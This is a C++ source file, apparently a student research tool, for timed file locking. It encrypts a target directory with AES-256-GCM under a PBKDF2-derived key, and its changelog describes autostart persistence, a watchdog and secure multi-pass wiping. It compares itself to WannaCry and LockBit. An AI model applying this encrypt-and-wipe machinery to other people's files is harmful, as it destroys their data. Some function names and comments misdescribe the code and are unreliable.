// Changelog v4.1  [Hafta 1 — sıfır bağımlılık varyantı]
// [SECURITY] Argon2id (libargon2) → PBKDF2-HMAC-SHA256 (pure C++, sıfır bağımlılık)
//            KDF tamamen mevcut SHA-256 implementasyonu üzerine inşa edildi (Section 8).
//            PBKDF2: RFC 2898 / NIST SP 800-132, 600.000 iterasyon (OWASP 2024).
//            NOT: PBKDF2 memory-hard değildir; GPU saldırısına Argon2id kadar dirençli
//            değildir. TÜBİTAK raporunda bu fark açıkça belgelenmelidir.
// [SECURITY] SHA-256(password) → PBKDF2-HMAC-SHA256 + 16-byte CSPRNG salt
//            Encrypted file format: [12-byte IV][16-byte SALT][ciphertext][16-byte GCM tag]
//            Her şifrelemede yeni salt üretilir; key hiçbir zaman diske yazılmaz.
// [SECURITY] Hardcoded ADMIN_PASSWORD_HASH kaldırıldı.
//            İlk çalıştırmada kullanıcıdan parola alınır, PBKDF2 hash + salt config'e kaydedilir.
//            Config formatı: <64-hex-hash>:<32-hex-salt>  (config_file: auth)
// [SECURITY] Key memory pinning: mlock() (Linux) / VirtualLock() (Windows)
//            Key bellekten silinmeden önce explicit_bzero / SecureZeroMemory ile sıfırlanır.
//
// Changelog v3.0
// [MERGE]    exp5 (security base) + ex6 Windows resolveHome(USERPROFILE) merged
// [SECURITY] XOR -> AES-256-GCM (per-file random IV/nonce, authenticated)
//            Windows: BCrypt native (AES-NI). Linux: pure C++ (zero deps).
// [SECURITY] secureDelete: full storage×filesystem matrix (v3)
//   Linux:
//     NVMe/SSD + CoW (btrfs/ZFS)     -> FITRIM only
//     NVMe/SSD + ext4/XFS/exFAT/FAT  -> 1-pass zero + fsync + FITRIM
//     HDD      + any                  -> 3-pass DoD (0x00/0xFF/0xA5)
//     RAM (tmpfs) / Network (NFS)     -> unlink only
//   Windows:
//     ReFS (CoW)                      -> TRIM IOCTL only
//     NTFS + SSD (no seek penalty)    -> 1-pass zero + TRIM IOCTL
//     NTFS + HDD                      -> 3-pass + TRIM IOCTL
//     exFAT / FAT32                   -> 3-pass
//   Detection: /sys/block/<dev>/queue/rotational (Linux), StorageDeviceSeekPenaltyProperty (Win)
//              /proc/mounts fstype (Linux), GetVolumeInformation (Win)
// [SECURITY] system() -> execvp() in relaunchInTerminal (no shell injection)
// [PERF]     processFiles: thread pool (min(hw_concurrency,8)) instead of serial
// [FIX]      resolveHome(): cross-platform — USERPROFILE on Windows, HOME on Linux
// [FIX]      Config paths: ~/.config/timedfilelock, lock: /tmp/timedfilelock.pid

// winlock.cpp — Timed File Lock & Wipe System
#include <iostream>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <thread>
#include <string>
#include <iomanip>
#include <sstream>
#include <vector>
#include <algorithm>
#include <future>
#include <cstring>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <atomic>
#include <functional>
#include <array>
#include <cstdint>
#include <random>

#ifdef _WIN32
    #include <windows.h>
    #include <conio.h>
    #include <bcrypt.h>       // AES-256-GCM
    #pragma comment(lib, "bcrypt.lib")
    // Secure disk erase on Windows
    #include <winioctl.h>
    #pragma comment(lib, "advapi32.lib")

    #ifndef ProcessHeapTerminateOnCorruptionPolicy
    #define ProcessHeapTerminateOnCorruptionPolicy (PROCESS_MITIGATION_POLICY)11
    #endif
    #ifndef _PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY_DEFINED
    #define _PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY_DEFINED
    typedef struct _PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY_CUSTOM {
        union {
            DWORD Flags;
            struct {
                DWORD HeapTerminateOnCorruption : 1;
                DWORD ReservedFlags : 31;
            };
        };
    } PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY_CUSTOM;
    #define PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY \
            PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY_CUSTOM
    #endif
#else
    #include <termios.h>
    #include <unistd.h>
    #include <sys/select.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <limits.h>
    #include <sys/file.h>
    #include <sys/resource.h>
    #include <sys/prctl.h>
    #include <sys/wait.h>
    #include <sys/stat.h>      // struct stat, lstat
    #include <sys/sysmacros.h> // major() — SSD detection via /sys/block
    #include <sys/ioctl.h>
    #include <sys/mman.h>      // mlock / munlock — key memory pinning (v4.0)
    #include <linux/fs.h>      // FITRIM
#endif

namespace fs = std::filesystem;

// ==========================================
// Constants
// ==========================================

// Cross-platform home directory (ex6 improvement merged)
static std::string resolveHome() {
#ifdef _WIN32
    const char* profile = getenv("USERPROFILE");
    if (profile) return std::string(profile);
    return "C:\\";
#else
    const char* home = getenv("HOME");
    if (home) return std::string(home);
    return "/tmp";
#endif
}

#ifdef _WIN32
const std::string TARGET_PATH    = resolveHome() + "\\Path_example";
#else
const std::string TARGET_PATH    = resolveHome() + "/pupy";
#endif

const int        LOCK_DURATION_SECONDS = 300;
constexpr size_t MAX_PASSWORD_LEN      = 128;

// AES-256-GCM parameters
constexpr size_t AES_KEY_SIZE  = 32;   // 256-bit key
constexpr size_t GCM_IV_SIZE   = 12;   // 96-bit IV (recommended for GCM)
constexpr size_t GCM_TAG_SIZE  = 16;   // 128-bit auth tag

// PBKDF2-HMAC-SHA256 parameters (OWASP 2024: min 600.000 iterasyon)
// Referans: NIST SP 800-132, RFC 2898
// NOT: Argon2id'den farklı olarak memory-hard değildir.
//      GPU saldırısına karşı daha zayıftır — TÜBİTAK raporunda belgelenmeli.
constexpr size_t   KDF_SALT_SIZE    = 16;      // 128-bit CSPRNG salt
constexpr uint32_t PBKDF2_ITERATIONS = 600000; // OWASP 2024 minimum önerisi
// Geriye dönük uyumluluk için ARGON2_SALT_SIZE aliası
constexpr size_t ARGON2_SALT_SIZE = KDF_SALT_SIZE;

// v4.0 Encrypted file format:
//   [12 bytes IV][16 bytes SALT][ciphertext][16 bytes GCM tag]
//
// Salt, key derivation için kullanılır ve her yeni şifreleme oturumunda
// CSPRNG ile yeniden üretilir. IV ve SALT dosyaya plaintext yazılır
// (gizli değil — kriptografik güvenlik key'den gelir).
// Key hiçbir zaman diske yazılmaz; bellekte mlock ile pinlenir.

#ifdef _WIN32
const char* REG_APP_KEY = "Software\\TimedFileLock";
#else
const std::string CONFIG_DIR     = resolveHome() + "/.config/timedfilelock";
const std::string CONFIG_FILE    = CONFIG_DIR + "/endtime";
const std::string AUTH_FILE      = CONFIG_DIR + "/auth";   // v4.0: Argon2id hash+salt
const std::string AUTOSTART_FILE = resolveHome() + "/.config/autostart/timedfilelock.desktop";
const std::string LOCK_FILE      = "/tmp/timedfilelock.pid";
#endif

// ── Global state ──────────────────────────────────────────────────────────
#ifdef _WIN32
static DWORD  g_watchdogPID      = 0;
static HANDLE g_hJob             = NULL;
static HANDLE g_hWatchdogProcess = NULL;
#else
static pid_t  g_watchdogPID = 0;
static int    g_lockFd      = -1;
#endif

// ==========================================
// SECTION 1: PBKDF2-HMAC-SHA256 Key Derivation (v4.1 — sıfır bağımlılık)
// ==========================================
//
// PBKDF2: Password-Based Key Derivation Function 2 (RFC 2898, NIST SP 800-132)
// PRF olarak HMAC-SHA256 kullanır. SHA-256 implementasyonu Section 8'de mevcut
// olduğundan hiçbir dış bağımlılık gerekmez.
//
// Yapı:
//   PBKDF2(pw, salt, c, dkLen):
//     T_i = F(pw, salt, c, i)
//     F(pw, salt, c, i) = U_1 XOR U_2 XOR ... XOR U_c
//     U_1 = HMAC-SHA256(pw, salt || INT32_BE(i))
//     U_j = HMAC-SHA256(pw, U_{j-1})
//
// Parametre seçimi: 600.000 iterasyon (OWASP 2024, NIST SP 800-132 §5.3)
//
// SHA-256(password) ile karşılaştırma:
//   SHA-256     → tek geçiş, GPU'da ~10^10 deneme/sn
//   PBKDF2 600k → 600.000 geçiş, GPU'da ~10^4 deneme/sn  (~milyon kat daha yavaş)
//
// Argon2id ile karşılaştırma (TÜBİTAK raporu için):
//   PBKDF2 → CPU-bound, GPU ile paralel kırılabilir (bellek kısıtı yok)
//   Argon2id → memory-hard (64 MB/deneme), GPU ile kırılması pratik değil
//   Referans: Blocki, J. et al. "Economics of Password Hashing" IEEE S&P 2018.
//
// WannaCry / LockBit karşılaştırması:
//   Bu araçlar raw AES key veya zayıf KDF kullandığından brute-force ile
//   key kurtarma mümkündü (CISA AA23-075A, AA20-302A).
//   PBKDF2-600k bu saldırı vektörünü önemli ölçüde zorlaştırır.

// Forward declarations (tanımlar ilerleyen section'larda)
static bool fillRandom(uint8_t* buf, size_t len);
bool timingSafeEqual(const std::string& a, const std::string& b);
// sha256Hex forward declaration — Section 8'de tanımlı
std::string sha256Hex(const std::string& msg);

// Hex string → byte array yardımcısı
static std::vector<uint8_t> hexToBytes(const std::string& hex) {
    std::vector<uint8_t> bytes(hex.size() / 2);
    for (size_t i = 0; i < bytes.size(); ++i)
        bytes[i] = (uint8_t)std::stoul(hex.substr(i * 2, 2), nullptr, 16);
    return bytes;
}

// Byte array → hex string yardımcısı
static std::string bytesToHex(const uint8_t* data, size_t len) {
    std::ostringstream oss;
    for (size_t i = 0; i < len; ++i)
        oss << std::hex << std::setw(2) << std::setfill('0') << (int)data[i];
    return oss.str();
}

// ── HMAC-SHA256 ───────────────────────────────────────────────────────────
// RFC 2104: HMAC(K, m) = SHA256((K XOR opad) || SHA256((K XOR ipad) || m))
// Tamamen mevcut sha256Hex() üzerine inşa edilmiştir.
// Çıktı: 32-byte ham hash (hex değil)
static std::array<uint8_t, 32> hmacSha256Raw(
        const uint8_t* key, size_t keyLen,
        const uint8_t* msg, size_t msgLen) {

    // Anahtar 64 byte'tan uzunsa önce hash'le
    std::array<uint8_t, 64> k{};
    if (keyLen > 64) {
        std::string keyStr(reinterpret_cast<const char*>(key), keyLen);
        std::string h = sha256Hex(keyStr);
        // hex → bytes
        for (size_t i = 0; i < 32; ++i)
            k[i] = (uint8_t)std::stoul(h.substr(i * 2, 2), nullptr, 16);
    } else {
        std::copy(key, key + keyLen, k.begin());
    }

    // ipad (0x36) ve opad (0x5C) XOR
    std::array<uint8_t, 64> ikey{}, okey{};
    for (int i = 0; i < 64; ++i) {
        ikey[i] = k[i] ^ 0x36;
        okey[i] = k[i] ^ 0x5C;
    }

    // inner = SHA256(ikey || msg)
    std::string innerInput(reinterpret_cast<const char*>(ikey.data()), 64);
    innerInput.append(reinterpret_cast<const char*>(msg), msgLen);
    std::string innerHex = sha256Hex(innerInput);

    // inner hex → bytes
    std::array<uint8_t, 32> innerBytes{};
    for (int i = 0; i < 32; ++i)
        innerBytes[i] = (uint8_t)std::stoul(innerHex.substr(i * 2, 2), nullptr, 16);

    // outer = SHA256(okey || inner)
    std::string outerInput(reinterpret_cast<const char*>(okey.data()), 64);
    outerInput.append(reinterpret_cast<const char*>(innerBytes.data()), 32);
    std::string outerHex = sha256Hex(outerInput);

    std::array<uint8_t, 32> result{};
    for (int i = 0; i < 32; ++i)
        result[i] = (uint8_t)std::stoul(outerHex.substr(i * 2, 2), nullptr, 16);
    return result;
}

// ── PBKDF2-HMAC-SHA256 ────────────────────────────────────────────────────
// RFC 2898 §5.2 — dkLen byte çıktı, 32 byte (SHA256) bloklar halinde
static void pbkdf2HmacSha256(
        const uint8_t* password, size_t pwLen,
        const uint8_t* salt,     size_t saltLen,
        uint32_t       iterations,
        uint8_t*       out,      size_t outLen) {

    uint32_t blockCount = (uint32_t)((outLen + 31) / 32);

    for (uint32_t block = 1; block <= blockCount; ++block) {
        // U_1 = HMAC(pw, salt || INT32_BE(block))
        std::vector<uint8_t> saltBlock(saltLen + 4);
        std::copy(salt, salt + saltLen, saltBlock.begin());
        saltBlock[saltLen + 0] = (uint8_t)(block >> 24);
        saltBlock[saltLen + 1] = (uint8_t)(block >> 16);
        saltBlock[saltLen + 2] = (uint8_t)(block >>  8);
        saltBlock[saltLen + 3] = (uint8_t)(block      );

        auto U = hmacSha256Raw(password, pwLen, saltBlock.data(), saltBlock.size());
        std::array<uint8_t, 32> T = U;

        // U_2 .. U_iterations
        for (uint32_t iter = 1; iter < iterations; ++iter) {
            U = hmacSha256Raw(password, pwLen, U.data(), 32);
            for (int b = 0; b < 32; ++b) T[b] ^= U[b];
        }

        // T_block → out
        size_t offset = (size_t)(block - 1) * 32;
        size_t toCopy = std::min((size_t)32, outLen - offset);
        std::copy(T.begin(), T.begin() + (std::ptrdiff_t)toCopy, out + offset);
    }
}

// ── KDF public interface ──────────────────────────────────────────────────
// (Argon2id versiyonuyla aynı imza — geri kalan kod değişmez)

// PBKDF2: password + salt → 256-bit AES key
// Key bellekte mlock ile pinlenir; çağıran secureZeroKey() çağırmalıdır.
static bool argon2idDeriveKey(const std::string& password,
                               const uint8_t* salt,
                               std::array<uint8_t, AES_KEY_SIZE>& outKey) {
    pbkdf2HmacSha256(
        reinterpret_cast<const uint8_t*>(password.data()), password.size(),
        salt, KDF_SALT_SIZE,
        PBKDF2_ITERATIONS,
        outKey.data(), AES_KEY_SIZE
    );
    // Key'i RAM'de kilitle — swap'a düşmesin
#ifdef _WIN32
    VirtualLock(outKey.data(), AES_KEY_SIZE);
#else
    mlock(outKey.data(), AES_KEY_SIZE);
#endif
    return true;
}

// PBKDF2: password + salt → doğrulama hash'i (config'e kaydedilir)
// Key DEĞİL — bu yalnızca parola doğrulama içindir.
// Farklı output offset (offset=32) kullanarak key'den ayrılır.
static std::string argon2idHash(const std::string& password, const uint8_t* salt) {
    std::array<uint8_t, AES_KEY_SIZE> hashBuf{};
    // Doğrulama hash'i: aynı pw+salt, farklı blok numarası (block 2)
    // → key (block 1) ile çakışmaz, aynı PBKDF2 çağrısından türetilebilir
    uint8_t saltWithTag[KDF_SALT_SIZE + 4];
    std::copy(salt, salt + KDF_SALT_SIZE, saltWithTag);
    // "verify" tag: son 4 byte 0xFF ile işaretlenir → key salt'ından farklı
    saltWithTag[KDF_SALT_SIZE + 0] = 0xFF;
    saltWithTag[KDF_SALT_SIZE + 1] = 0xFF;
    saltWithTag[KDF_SALT_SIZE + 2] = 0xFF;
    saltWithTag[KDF_SALT_SIZE + 3] = 0xFF;
    pbkdf2HmacSha256(
        reinterpret_cast<const uint8_t*>(password.data()), password.size(),
        saltWithTag, KDF_SALT_SIZE + 4,
        PBKDF2_ITERATIONS,
        hashBuf.data(), AES_KEY_SIZE
    );
    return bytesToHex(hashBuf.data(), AES_KEY_SIZE);
}

// Key'i bellekten güvenli sil (SecureZeroMemory / explicit_bzero)
static void secureZeroKey(std::array<uint8_t, AES_KEY_SIZE>& key) {
#ifdef _WIN32
    SecureZeroMemory(key.data(), AES_KEY_SIZE);
    VirtualUnlock(key.data(), AES_KEY_SIZE);
#else
    explicit_bzero(key.data(), AES_KEY_SIZE);
    munlock(key.data(), AES_KEY_SIZE);
#endif
    key.fill(0);
}

// ==========================================
// SECTION 1b: Password Config (v4.0)
// ==========================================
// Hardcoded hash yok. İlk çalıştırmada:
//   1. Kullanıcıdan parola alınır (masked input)
//   2. 16-byte CSPRNG salt üretilir
//   3. Argon2id(password, salt) → hash
//   4. "<hash>:<salt>" config dosyasına / Registry'e kaydedilir
//
// Sonraki çalıştırmalarda:
//   1. Config'den hash + salt okunur
//   2. Kullanıcı parolası Argon2id ile hash'lenir, karşılaştırılır
//   3. Doğruysa: Argon2id(password, salt) → AES key türetilir

struct AuthConfig {
    std::string hashHex;                        // 64-char hex (Argon2id output)
    std::array<uint8_t, ARGON2_SALT_SIZE> salt{}; // 16-byte CSPRNG salt
    bool valid = false;
};

#ifdef _WIN32
// Windows: hash ve salt Registry'de saklanır
static const char* REG_HASH_VALUE = "AuthHash";
static const char* REG_SALT_VALUE = "AuthSalt";

static AuthConfig loadAuthConfig() {
    AuthConfig cfg;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return cfg;

    char hashBuf[128] = {}; DWORD hashSize = sizeof(hashBuf);
    char saltBuf[128] = {}; DWORD saltSize = sizeof(saltBuf);
    bool hashOk = RegQueryValueExA(hKey, REG_HASH_VALUE, NULL, NULL,
                                   (LPBYTE)hashBuf, &hashSize) == ERROR_SUCCESS;
    bool saltOk = RegQueryValueExA(hKey, REG_SALT_VALUE, NULL, NULL,
                                   (LPBYTE)saltBuf, &saltSize) == ERROR_SUCCESS;
    RegCloseKey(hKey);

    if (!hashOk || !saltOk) return cfg;
    cfg.hashHex = std::string(hashBuf);
    auto saltBytes = hexToBytes(std::string(saltBuf));
    if (saltBytes.size() != ARGON2_SALT_SIZE) return cfg;
    std::copy(saltBytes.begin(), saltBytes.end(), cfg.salt.begin());
    cfg.valid = true;
    return cfg;
}

static bool saveAuthConfig(const std::string& hashHex,
                            const std::array<uint8_t, ARGON2_SALT_SIZE>& salt) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL)
        != ERROR_SUCCESS) return false;
    std::string saltHex = bytesToHex(salt.data(), ARGON2_SALT_SIZE);
    RegSetValueExA(hKey, REG_HASH_VALUE, 0, REG_SZ,
                   (BYTE*)hashHex.c_str(), (DWORD)hashHex.size() + 1);
    RegSetValueExA(hKey, REG_SALT_VALUE, 0, REG_SZ,
                   (BYTE*)saltHex.c_str(), (DWORD)saltHex.size() + 1);
    RegCloseKey(hKey);
    return true;
}

static void clearAuthConfig() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, KEY_SET_VALUE, &hKey)
        == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, REG_HASH_VALUE);
        RegDeleteValueA(hKey, REG_SALT_VALUE);
        RegCloseKey(hKey);
    }
}

#else
// Linux: "<hashHex>:<saltHex>" formatında AUTH_FILE'a kaydedilir
static AuthConfig loadAuthConfig() {
    AuthConfig cfg;
    std::ifstream f(AUTH_FILE);
    if (!f) return cfg;
    std::string line;
    if (!std::getline(f, line)) return cfg;

    auto colonPos = line.find(':');
    if (colonPos == std::string::npos) return cfg;
    cfg.hashHex = line.substr(0, colonPos);
    std::string saltHex = line.substr(colonPos + 1);
    if (cfg.hashHex.size() != AES_KEY_SIZE * 2 || saltHex.size() != ARGON2_SALT_SIZE * 2)
        return cfg;
    auto saltBytes = hexToBytes(saltHex);
    std::copy(saltBytes.begin(), saltBytes.end(), cfg.salt.begin());
    cfg.valid = true;
    return cfg;
}

static bool saveAuthConfig(const std::string& hashHex,
                            const std::array<uint8_t, ARGON2_SALT_SIZE>& salt) {
    std::error_code ec;
    fs::create_directories(CONFIG_DIR, ec);
    std::ofstream f(AUTH_FILE);
    if (!f) return false;
    f << hashHex << ":" << bytesToHex(salt.data(), ARGON2_SALT_SIZE) << "\n";
    chmod(AUTH_FILE.c_str(), 0600); // yalnızca sahip okuyabilsin
    return true;
}

static void clearAuthConfig() {
    std::error_code ec;
    fs::remove(AUTH_FILE, ec);
}
#endif

// ==========================================
// SECTION 1c: İlk kurulum veya oturum açma
// ==========================================
// Dönüş: (key, authConfig) çifti. Başarısızlıkta key sıfır, cfg.valid=false.
// Çağıran, key'i işi bitince secureZeroKey() ile silmekle yükümlüdür.

static std::string promptPasswordMasked(const std::string& prompt) {
    std::cout << prompt << std::flush;
    std::string pw;
#ifdef _WIN32
    int ch;
    while ((ch = _getch()) != '\r' && ch != '\n') {
        if ((ch == '\b' || ch == 127) && !pw.empty()) { pw.pop_back(); std::cout << "\b \b"; }
        else if (ch >= 32 && ch <= 126 && pw.size() < MAX_PASSWORD_LEN) { pw += (char)ch; std::cout << '*'; }
    }
#else
    struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ECHO | ICANON);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
    int ch;
    while ((ch = getchar()) != '\n' && ch != EOF) {
        if ((ch == '\b' || ch == 127) && !pw.empty()) { pw.pop_back(); std::cout << "\b \b"; }
        else if (ch >= 32 && ch <= 126 && pw.size() < MAX_PASSWORD_LEN) { pw += (char)ch; std::cout << '*'; }
    }
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
#endif
    std::cout << "\n";
    return pw;
}

struct SessionAuth {
    std::array<uint8_t, AES_KEY_SIZE> key{};
    std::array<uint8_t, ARGON2_SALT_SIZE> salt{};
    std::string hashHex;
    bool success = false;
};

// İlk kurulum: parola belirle, salt üret, Argon2id key türet, config'e kaydet
static SessionAuth setupFirstRun() {
    SessionAuth sa;
    std::cout << "\n[v4.0] İlk çalıştırma — yönetici parolası belirleniyor.\n";

    std::string pw1 = promptPasswordMasked("Parola: ");
    std::string pw2 = promptPasswordMasked("Parola (tekrar): ");
    if (pw1 != pw2) {
        std::cerr << "[HATA] Parolalar eşleşmiyor.\n";
        return sa;
    }
    if (pw1.size() < 8) {
        std::cerr << "[HATA] Parola en az 8 karakter olmalı.\n";
        return sa;
    }

    if (!fillRandom(sa.salt.data(), ARGON2_SALT_SIZE)) {
        std::cerr << "[HATA] CSPRNG salt üretimi başarısız.\n";
        return sa;
    }

    std::cout << "[KDF] PBKDF2-HMAC-SHA256 çalışıyor ("
              << PBKDF2_ITERATIONS << " iterasyon) — lütfen bekleyin...\n";

    if (!argon2idDeriveKey(pw1, sa.salt.data(), sa.key)) return sa;
    sa.hashHex = argon2idHash(pw1, sa.salt.data());

    // Parolayı bellekten sil
    std::fill(pw1.begin(), pw1.end(), '\0');
    std::fill(pw2.begin(), pw2.end(), '\0');

    if (!saveAuthConfig(sa.hashHex, sa.salt)) {
        std::cerr << "[HATA] Auth config kaydedilemedi.\n";
        secureZeroKey(sa.key);
        return sa;
    }
    sa.success = true;
    return sa;
}

// Mevcut oturum: config'den salt oku, parola doğrula, key türet
static SessionAuth authenticate() {
    SessionAuth sa;
    AuthConfig cfg = loadAuthConfig();

    if (!cfg.valid) {
        // İlk çalıştırma
        return setupFirstRun();
    }

    sa.salt = cfg.salt;
    std::string pw = promptPasswordMasked("Parola: ");

    std::cout << "[KDF] PBKDF2-HMAC-SHA256 doğrulanıyor...\n";
    std::string inputHash = argon2idHash(pw, cfg.salt.data());

    // Timing-safe karşılaştırma
    bool match = timingSafeEqual(inputHash, cfg.hashHex);
    std::fill(pw.begin(), pw.end(), '\0');

    if (!match) {
        std::cerr << "[!] Yanlış parola.\n";
        return sa;
    }

    // Parola doğru → key türet
    if (!argon2idDeriveKey(pw, cfg.salt.data(), sa.key)) return sa;
    sa.hashHex  = cfg.hashHex;
    sa.success  = true;
    return sa;
}

// ==========================================
// SECTION 2: CSPRNG
// ==========================================
static bool fillRandom(uint8_t* buf, size_t len) {
#ifdef _WIN32
    return BCryptGenRandom(NULL, buf, (ULONG)len, BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0;
#else
    int fd = open("/dev/urandom", O_RDONLY | O_CLOEXEC);
    if (fd < 0) return false;
    size_t done = 0;
    while (done < len) {
        ssize_t r = read(fd, buf + done, len - done);
        if (r <= 0) { close(fd); return false; }
        done += (size_t)r;
    }
    close(fd);
    return true;
#endif
}

// ==========================================
// SECTION 3: AES-256-GCM Implementation
// ==========================================
// Windows: delegates to BCrypt (hardware AES-NI).
// Linux:   pure C++ (no external deps).

#ifdef _WIN32
// ── Windows BCrypt AES-256-GCM ────────────────────────────────────────────

struct WinAesGcm {
    BCRYPT_ALG_HANDLE hAlg  = NULL;
    BCRYPT_KEY_HANDLE hKey  = NULL;
    std::vector<uint8_t> keyObj;

    bool init(const uint8_t* keyBytes) {
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0)
            return false;
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0)
            return false;
        DWORD keyObjSize = 0, dummy = 0;
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                (PUCHAR)&keyObjSize, sizeof(keyObjSize), &dummy, 0);
        keyObj.resize(keyObjSize);
        if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), keyObjSize,
                (PUCHAR)keyBytes, (ULONG)AES_KEY_SIZE, 0) != 0)
            return false;
        return true;
    }

    // Returns ciphertext + 16-byte tag appended
    bool encrypt(const uint8_t* iv, const uint8_t* plain, size_t plainLen,
                 std::vector<uint8_t>& out) {
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce    = (PUCHAR)iv;
        authInfo.cbNonce    = (ULONG)GCM_IV_SIZE;
        authInfo.pbTag      = nullptr; // filled after
        authInfo.cbTag      = (ULONG)GCM_TAG_SIZE;

        out.resize(plainLen + GCM_TAG_SIZE);
        std::vector<uint8_t> tag(GCM_TAG_SIZE);
        authInfo.pbTag = tag.data();

        DWORD outLen = 0;
        NTSTATUS st = BCryptEncrypt(hKey, (PUCHAR)plain, (ULONG)plainLen,
                &authInfo, nullptr, 0,
                out.data(), (ULONG)plainLen, &outLen, 0);
        if (st != 0) return false;
        memcpy(out.data() + plainLen, tag.data(), GCM_TAG_SIZE);
        out.resize(outLen + GCM_TAG_SIZE);
        return true;
    }

    // Expects ciphertext with 16-byte tag appended
    bool decrypt(const uint8_t* iv, const uint8_t* cipherWithTag, size_t totalLen,
                 std::vector<uint8_t>& out) {
        if (totalLen < GCM_TAG_SIZE) return false;
        size_t cipherLen = totalLen - GCM_TAG_SIZE;
        const uint8_t* tag = cipherWithTag + cipherLen;

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = (PUCHAR)iv;
        authInfo.cbNonce = (ULONG)GCM_IV_SIZE;
        authInfo.pbTag   = (PUCHAR)tag;
        authInfo.cbTag   = (ULONG)GCM_TAG_SIZE;

        out.resize(cipherLen);
        DWORD outLen = 0;
        NTSTATUS st = BCryptDecrypt(hKey, (PUCHAR)cipherWithTag, (ULONG)cipherLen,
                &authInfo, nullptr, 0,
                out.data(), (ULONG)cipherLen, &outLen, 0);
        if (st != 0) return false;
        out.resize(outLen);
        return true;
    }

    ~WinAesGcm() {
        if (hKey)  BCryptDestroyKey(hKey);
        if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    }
};

// Encrypt file buffer → returns IV+ciphertext+tag or empty on failure
static std::vector<uint8_t> aesGcmEncrypt(
        const std::array<uint8_t, AES_KEY_SIZE>& key,
        const std::vector<uint8_t>& plaintext) {
    uint8_t iv[GCM_IV_SIZE];
    if (!fillRandom(iv, GCM_IV_SIZE)) return {};

    WinAesGcm ctx;
    if (!ctx.init(key.data())) return {};

    std::vector<uint8_t> cipherAndTag;
    if (!ctx.encrypt(iv, plaintext.data(), plaintext.size(), cipherAndTag)) return {};

    // Prepend IV
    std::vector<uint8_t> result(GCM_IV_SIZE + cipherAndTag.size());
    memcpy(result.data(), iv, GCM_IV_SIZE);
    memcpy(result.data() + GCM_IV_SIZE, cipherAndTag.data(), cipherAndTag.size());
    return result;
}

static std::vector<uint8_t> aesGcmDecrypt(
        const std::array<uint8_t, AES_KEY_SIZE>& key,
        const std::vector<uint8_t>& blob) {
    if (blob.size() < GCM_IV_SIZE + GCM_TAG_SIZE) return {};
    const uint8_t* iv          = blob.data();
    const uint8_t* cipherAndTag = blob.data() + GCM_IV_SIZE;
    size_t cipherAndTagLen     = blob.size() - GCM_IV_SIZE;

    WinAesGcm ctx;
    if (!ctx.init(key.data())) return {};

    std::vector<uint8_t> plain;
    if (!ctx.decrypt(iv, cipherAndTag, cipherAndTagLen, plain)) return {};
    return plain;
}

#else
// ── Linux: Pure C++ AES-256-GCM (zero external deps) ─────────────────────
// AES core: FIPS 197 compliant, constant-time-ish lookup tables.
// GCM: NIST SP 800-38D, 96-bit IV, 128-bit tag.

namespace aes_impl {

static const uint8_t SBOX[256] = {
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
